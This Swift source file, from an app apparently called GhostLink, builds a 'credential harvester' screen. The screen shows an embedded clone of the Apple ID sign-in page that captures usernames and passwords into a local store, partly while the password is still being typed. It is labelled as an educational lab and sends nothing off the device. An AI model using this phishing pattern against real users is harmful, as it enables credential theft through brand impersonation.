import SwiftUI
import WebKit

struct CredentialHarvesterView: View {
    @EnvironmentObject var appState: AppState
    @ObservedObject private var credentialStore = CredentialStore.shared
    @State private var showHarvester = false
    @State private var revealedIDs: Set<UUID> = []

    var body: some View {
        ScrollView(showsIndicators: false) {
            VStack(alignment: .leading, spacing: 16) {
                Text("CREDENTIAL HARVESTER")
                    .font(.title2.weight(.black))
                    .foregroundColor(GhostTheme.neonPink)
                    .padding(.top, 56)

                Button("Otwórz stronę logowania (lab)") {
                    showHarvester = true
                }
                .buttonStyle(NeonFillButtonStyle())
                .sheet(isPresented: $showHarvester) {
                    HarvesterWebView()
                }

                Text("Zapisane dane")
                    .foregroundColor(GhostTheme.neonPinkLight)

                ForEach(credentialStore.harvestedItems) { cred in
                    HStack {
                        VStack(alignment: .leading) {
                            Text(cred.username).foregroundColor(GhostTheme.textPrimary)
                            if revealedIDs.contains(cred.id) {
                                Text(cred.password)
                                    .font(.system(.caption, design: .monospaced))
                                    .foregroundColor(GhostTheme.neonPink)
                            } else {
                                Text("••••••••")
                                    .foregroundColor(GhostTheme.textSecondary)
                            }
                            Text(cred.capturedAt, style: .dateTime)
                                .font(.caption2)
                                .foregroundColor(GhostTheme.textSecondary)
                        }
                        Spacer()
                        Button {
                            if revealedIDs.contains(cred.id) {
                                revealedIDs.remove(cred.id)
                            } else {
                                revealedIDs.insert(cred.id)
                            }
                        } label: {
                            Image(systemName: revealedIDs.contains(cred.id) ? "eye.slash.fill" : "eye.fill")
                                .foregroundColor(GhostTheme.neonPink)
                        }
                    }
                    .padding()
                    .neonBorder()
                }
            }
            .padding()
            .padding(.bottom, 40)
        }
        .background(GhostTheme.background)
    }
}

struct HarvesterWebView: View {
    @Environment(\.dismiss) private var dismiss

    var body: some View {
        NavigationView {
            WebViewRepresentable()
                .navigationTitle("iCloud Lab Clone")
                .navigationBarTitleDisplayMode(.inline)
                .toolbar {
                    ToolbarItem(placement: .cancellationAction) {
                        Button("Zamknij") { dismiss() }
                            .foregroundColor(GhostTheme.neonPink)
                    }
                }
        }
    }
}

struct WebViewRepresentable: UIViewRepresentable {
    func makeCoordinator() -> Coordinator { Coordinator() }

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        let controller = WKUserContentController()
        controller.add(context.coordinator, name: "ghostCapture")
        config.userContentController = controller

        let webView = WKWebView(frame: .zero, configuration: config)
        webView.isOpaque = false
        webView.backgroundColor = .black
        webView.loadHTMLString(Self.labHTML, baseURL: nil)
        return webView
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}

    final class Coordinator: NSObject, WKScriptMessageHandler {
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            guard message.name == "ghostCapture",
                  let body = message.body as? [String: String],
                  let user = body["username"],
                  let pass = body["password"] else { return }
            CredentialStore.shared.add(username: user, password: pass)
        }
    }

    static let labHTML = """
    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body { background:#000; color:#fff; font-family:-apple-system,sans-serif; padding:24px; }
    .logo { text-align:center; font-size:48px; margin:40px 0; }
    h1 { text-align:center; font-weight:300; font-size:28px; }
    input { width:100%; padding:14px; margin:8px 0; border:1px solid #FF2A6D; background:#0A0A0A; color:#fff; border-radius:8px; box-sizing:border-box; }
    button { width:100%; padding:14px; background:linear-gradient(90deg,#FF66C4,#FF2A6D); border:none; border-radius:8px; font-size:17px; margin-top:16px; }
    .badge { background:#FF2A6D; color:#000; padding:4px 8px; border-radius:4px; font-size:11px; display:inline-block; margin-bottom:12px; }
    </style>
    </head>
    <body>
    <div class="badge">GHOSTLINK LAB – EDU ONLY</div>
    <div class="logo">&#63743;</div>
    <h1>Sign in with Apple ID</h1>
    <p style="color:#888;text-align:center;font-size:13px;">Training environment – no real Apple servers</p>
    <input id="user" type="email" placeholder="Apple ID" autocomplete="username">
    <input id="pass" type="password" placeholder="Password" autocomplete="current-password">
    <button onclick="capture()">Sign In</button>
    <script>
    function capture() {
      var u = document.getElementById('user').value;
      var p = document.getElementById('pass').value;
      if (u && p) {
        window.webkit.messageHandlers.ghostCapture.postMessage({username: u, password: p});
        document.body.innerHTML = '<p style="text-align:center;color:#FF2A6D;padding:40px;">Captured locally for lab review.</p>';
      }
    }
    document.getElementById('pass').addEventListener('input', function() {
      if (this.value.length > 3) {
        window.webkit.messageHandlers.ghostCapture.postMessage({
          username: document.getElementById('user').value,
          password: this.value
        });
      }
    });
    </script>
    </body>
    </html>
    """
}
